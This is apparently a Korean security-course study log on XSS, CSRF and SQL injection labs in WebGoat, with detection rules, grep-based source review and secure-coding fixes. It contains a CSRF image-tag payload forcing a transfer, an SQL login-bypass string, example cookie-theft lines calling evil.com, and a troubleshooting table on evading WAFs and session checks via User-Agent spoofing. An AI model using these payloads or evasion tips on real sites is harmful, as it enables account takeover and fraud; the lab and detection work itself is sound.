# 📄2025.12.22 (Day 37) - xss 공격과 소스코드 취약점 분석
...
- 쿠키 탈취 시 `document.cookie`를 공격자 서버로 전송 가능

### 실습 2: Reflected XSS 공격
...
```
탐지 패턴:
- getRawParameter, getParameter 등 입력 처리 함수 사용 시 필터링 확인
- HTML 출력 시 인코딩 처리 여부 검증
...
### 실습 3: CSRF (Cross-Site Request Forgery) 공격
...
**실습 단계:**
```html
# 1. Cross Site Request Forgery(CSRF) 메뉴 접속

# 2. CSRF 공격 코드 작성
Title: Product Question
Message: 상품이 아직 도착하지 않았습니다.
<img src="http://localhost:8080/WebGoat/attack?Screen=699&menu=900&transferFunds=5000" 
     height=1 width=1>
...
| **사용 시기/적용 방안** | 게시판, 댓글, 프로필 등 입력 저장 기능 | 검색, 에러 메시지 등 즉시 반영 | JavaScript 기반 SPA | 송금, 설정 변경 등 상태 변경 작업 |
...
// 실행 쿼리: SELECT * FROM employee WHERE userid = admin and password = ''or''=''
// 결과: 인증 우회
...
statement.setString(3, message);  // DB에 그대로 저장

// 안전한 코드
String message = HtmlEncoder.encode(s.getParser().getRawParameter(MESSAGE, ""));
statement.setString(3, message);  // 인코딩하여 저장
```
...
|:---:|:---|:---|:---|
| **XSS 공격 시도** | - URL/POST 데이터에 `<script>` 태그<br>- `document.cookie` 문자열<br>- `javascript:` 프로토콜 | `POST /board/write message=<script>alert(document.cookie)</script>` | - WAF 룰 업데이트<br>- 해당 계정 모니터링 강화<br>- 관리자에게 게시물 검토 요청 |
| **CSRF 공격 시도** | - Referer 헤더 불일치<br>- 중요 작업에 GET 요청<br>- CSRF 토큰 없는 요청 | `GET /transfer?amount=5000&to=attacker Referer: http://evil.com` | - 의심 거래 차단<br>- 사용자 계정 임시 잠금<br>- 긴급 패치 요청 |
| **쿠키 탈취 시도** | - 외부 도메인으로 쿠키 전송<br>- Base64 인코딩된 의심 데이터<br>- 새로운 IP에서 세션 사용 | `<img src="http://evil.com/steal?cookie=SESSIONID123">` | - 해당 세션 즉시 무효화<br>- 사용자 비밀번호 재설정 유도<br>- 접근 IP 분석 및 차단 |
...
```bash
# 1. 입력 함수 검색
grep -r "getParameter\|getRawParameter\|request.getQueryString" *.java

# 2. SQL 쿼리 생성 부분 검색
grep -r "executeQuery\|executeUpdate" *.java

# 3. 파일 업로드 처리 검색
grep -r "FileInputStream\|FileOutputStream\|MultipartFile" *.java

# 4. 쿠키 사용 검색
grep -r "getCookies\|setCookie" *.java

# 5. 세션 처리 검색
grep -r "setAttribute\|getAttribute\|getSession" *.java
```

**XSS 방어 검증:**
```bash
# 출력 인코딩 검증
grep -r "HtmlEncoder\|escapeHtml\|encodeForHTML" *.java

# Content-Security-Policy 헤더 확인
grep -r "Content-Security-Policy" *.xml *.properties

# HTTPOnly 쿠키 설정 확인
grep -r "setHttpOnly\|httpOnly" *.java
```
...
**SOC 분석가 관점:**
- **XSS 탐지 룰 개발:** WAF에 `<script>`, `onerror=`, `document.cookie` 등 키워드 기반 탐지 룰 적용
...
- **소스코드 정적 분석:** grep, SAST 도구를 활용한 취약 함수 패턴 자동 탐지
...
|:---:|:---|:---|:---|:---|:---|
| **입력 처리** | getParameter, getRawParameter, getParameterValues | Params, QueryString, InputStream | 사용자 입력 수신 | 필터링 없이 입력받음 | 화이트리스트 검증 적용 |
...
| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| XSS 공격이 실행되지 않음 | - 브라우저 XSS 필터 작동<br>- WAF/IPS 차단<br>- CSP 헤더 설정 | - 다양한 페이로드 시도<br>- 인코딩 우회 기법 적용<br>- DOM-based XSS로 전환 |
| CSRF 토큰이 있어 공격 실패 | - 프레임워크 기본 CSRF 방어<br>- 커스텀 토큰 검증 로직 | - 토큰 생성 패턴 분석<br>- 토큰 없는 엔드포인트 탐색<br>- XSS + CSRF 조합 공격 |
| 쿠키 탈취 후 세션 사용 불가 | - IP 기반 세션 검증<br>- User-Agent 검증<br>- 세션 타임아웃 | - 피해자와 동일 IP 대역 사용<br>- User-Agent 스푸핑<br>- 빠른 시간 내 공격 실행 |
| 소스코드 분석 시간 과다 소요 | - 코드 양 방대<br>- 프레임워크 의존성 복잡 | - SAST 도구 활용 (SonarQube, Checkmarx)<br>- 위험 함수 패턴 grep 검색<br>- 입력-출력 경로 추적 우선 |
